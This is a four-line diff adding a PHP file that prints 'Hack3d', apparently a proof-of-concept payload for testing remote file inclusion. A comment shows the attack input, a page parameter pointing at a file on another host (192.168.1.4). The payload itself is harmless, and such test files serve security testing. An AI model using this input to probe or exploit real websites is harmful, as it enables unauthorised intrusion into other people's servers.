@@ -1,0 +1,4 @@
+<?php echo "Hack3d";
+// Simple test RFI vulnerability
+// ?page=http://192.168.1.4/RFI.txt
+?>
